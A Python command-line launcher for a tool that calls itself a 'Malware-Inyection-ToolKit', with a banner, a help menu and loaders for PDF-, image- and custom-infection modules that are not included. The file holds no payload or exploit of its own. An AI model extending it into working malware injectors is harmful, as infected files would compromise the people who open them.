# NSec-Inyection by @nervius25

import os
import importlib
import time
import sys

def load_module(module_name):
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))

        module_parts = module_name.split('.')
        module_path = os.path.join(script_dir, *module_parts[:-1], f"{module_parts[-1]}.py")

        module_path = os.path.normpath(module_path)

        spec = importlib.util.spec_from_file_location(module_name, module_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)

        if hasattr(module, "main"):
            module.main()
        else:
            print(f"\n\x1b[31m[!]\x1b[0m Error: Module '{module_name}' does not have a 'main'.\n")

    except ImportError:
        print(f"\n\x1b[31m[!]\x1b[0m Error: Module '{module_name}' Not Found.\n")

def img():
    try:
        charged_v = "◻◻◻◻◻"
        charged_c = "◼◼◼◼◼"
        for _ in range(1):
            for i in range(5):
                sys.stdout.write(f"\r{charged_c[:i]}{charged_v[i:]} \x1b[35mLoad the IMG-INFECTION module.\x1b[0m")
                sys.stdout.flush()
                time.sleep(0.8)
        load_module("modules.img.img")
    except ImportError:
        print("\n\x1b[31m[!]\x1b[0m Error: Module Not Found.\n")

def pdf():
    try:
        charged_v = "◻◻◻◻◻"
        charged_c = "◼◼◼◼◼"
        for _ in range(1):
            for i in range(5):
                sys.stdout.write(f"\r{charged_c[:i]}{charged_v[i:]} \x1b[35mLoad the PDF-INFECTION module.\x1b[0m")
                sys.stdout.flush()
                time.sleep(0.8)
        load_module("modules.pdf.pdf")
    except ImportError:
        print("\n\x1b[31m[!]\x1b[0m Error: Module Not Found.\n")

def customized():
    try:
        charged_v = "◻◻◻◻◻"
        charged_c = "◼◼◼◼◼"
        for _ in range(1):
            for i in range(5):
                sys.stdout.write(f"\r{charged_c[:i]}{charged_v[i:]} \x1b[35mLoad the CUSTOMIZED-INFECTION module.\x1b[0m")
                sys.stdout.flush()
                time.sleep(0.8)
        load_module("modules.customized.customized")
    except ImportError:
        print("\n\x1b[31m[!]\x1b[0m Error: Module Not Found.\n")

def help():
    print(f"\x1b[1m\x1b[97mHelp:\x1b[0m")
    print(f" \x1b[1m\x1b[33mCommands:\x1b[0m")
    print(f" |―― exit, quit, e or q          :: Exit N-Sec.")
    print(f" |―― help                        :: View all commands.")
    print(f" |―― clear                       :: Clear the screen.")
    print(f"")
    print(f" \x1b[1m\x1b[34mModules:\x1b[0m\n")
    print(f" |―― \x1b[31mpdf\x1b[0m                         :: Load the PDF-INFECTION module.")
    print(f" |―― \x1b[32mimg\x1b[0m                         :: Load the IMG-INFECTION module.")
    print(f" |―― \x1b[90mcustomized\x1b[0m                  :: Load the CUSTOMIZED-INFECTION module." \
          f"\n")

def clear():
    os.system('cls')

def check_compatibility():
    if os.name != 'nt':
        print("\n\x1b[31m[!]\x1b[0m This program is only compatible with Windows.\n")
        exit()

def main():
    try:
        check_compatibility()

        clear()
        banned_ns = f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" \
                    f"                  \x1b[38;2;69;161;215m  (\x1b[0m\n" \
                    f"                  \x1b[38;2;69;161;215m  )\ )   )       ) (\x1b[0m     \x1b[1m\x1b[97mv1.0\x1b[0m\n" \
                    f"                  \x1b[38;2;69;161;215m(() /   /(     (_ ( )\x1b[0m\n" \
                    f"                  \x1b[38;2;69;161;215m /(_)))(_))    )\ |/(\x1b[0m\n" \
                    f"                  \x1b[38;2;69;161;215m(\x1b[0m\x1b[38;2;145;83;173m_\x1b[0m\x1b[38;2;69;161;215m))\x1b[0m \x1b[38;2;145;83;173m_\x1b[0m\x1b[38;2;69;161;215m(\x1b[0m\x1b[38;2;145;83;173m____\x1b[0m\x1b[38;2;69;161;215m)\x1b[0m  \x1b[38;2;69;161;215m/(\x1b[0m\x1b[38;2;145;83;173m_\x1b[0m\x1b[38;2;69;161;215m)(\x1b[0m\x1b[38;2;145;83;173m_\x1b[0m\x1b[38;2;69;161;215m)\x1b[0m\n" \
                    f"                  \x1b[38;2;145;83;173m| \ | / ___|\x1b[0m \x1b[38;2;69;161;215m(\x1b[0m\x1b[38;2;145;83;173m___\x1b[0m\x1b[38;2;69;161;215m)(\x1b[0m\x1b[38;2;145;83;173m___\x1b[0m\x1b[38;2;69;161;215m)\x1b[0m\n" \
                    f"                  \x1b[38;2;145;83;173m|  \| \___ \ / _ \/ __|\x1b[0m\n" \
                    f"                  \x1b[38;2;145;83;173m| |\  |___) |  __/ (__\x1b[0m\n" \
                    f"                  \x1b[38;2;53;119;231m|_| \_|____/ \___|\___|\x1b[0m\n" \
                    f"\n" \
                    f"                 \x1b[1m\x1b[97mMalware-Inyection-ToolKit\x1b[0m\n" \
                    f"                 \x1b[1m\x1b[97m            by\x1b[0m\n" \
                    f"                 \x1b[1m\x1b[97m         nervius25\x1b[0m\n" \
                    f"\n" \
                    f"BY USING THIS SOFTWARE, YOU MUST AGREE TO TAKE FULL RESPONSIBILITY\n" \
                    f"FOR ANY DAMAGE CAUSED BY N-Sec.\n" \
                    f"N-Sec SHOULD NOT SUGGEST PEOPLE TO PERFORM ILLEGAL ACTIVITIES.\n" \
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" \
                    f"\x1b[1m\x1b[97mHelp\x1b[0m\n" \
                    f" \x1b[1m\x1b[33mCommands:\x1b[0m\n" \
                    f" |―― exit, quit, e or q          :: Exit N-Sec.\n" \
                    f" |―― help                        :: View all commands.\n" \
                    f" |―― clear                       :: Clear the screen.\n" \
                    f"\n" \
                    f" \x1b[1m\x1b[34mModules:\x1b[0m\n" \
                    f" |―― \x1b[31mpdf\x1b[0m                         :: Load the PDF-INFECTION module.\n" \
                    f" |―― \x1b[32mimg\x1b[0m                         :: Load the IMG-INFECTION module.\n" \
                    f" |―― \x1b[90mcustomized\x1b[0m                  :: Load the CUSTOMIZED-INFECTION module." \
                    f"\n"
        print(banned_ns)

        while True:
            command = input(">> ").strip().split()

            if not command:
                continue

            if command[0] == 'pdf':
                pdf()

            elif command[0].lower() == 'img':
                img()

            elif command[0].lower() == 'customized':
                customized()

            elif command[0].lower() == 'help':
                help()

            elif command[0].lower() == 'exit':
                print("Have a nice day.\n")
                exit()

            elif command[0].lower() == 'quit':
                print("Have a nice day.\n")
                exit()

            elif command[0].lower() == 'e':
                print("Have a nice day.\n")
                exit()

            elif command[0].lower() == 'q':
                print("Have a nice day.\n")
                exit()

            elif command[0].lower() == 'clear':
                clear()

            else:
                print("\n\x1b[31mThe command you entered does not exist.\x1b[0m\n")

    except (KeyboardInterrupt, EOFError):
        print("Have a nice day.\n")
        exit()

if __name__ == "__main__":
    main()

# NSec-Inyection by @nervius25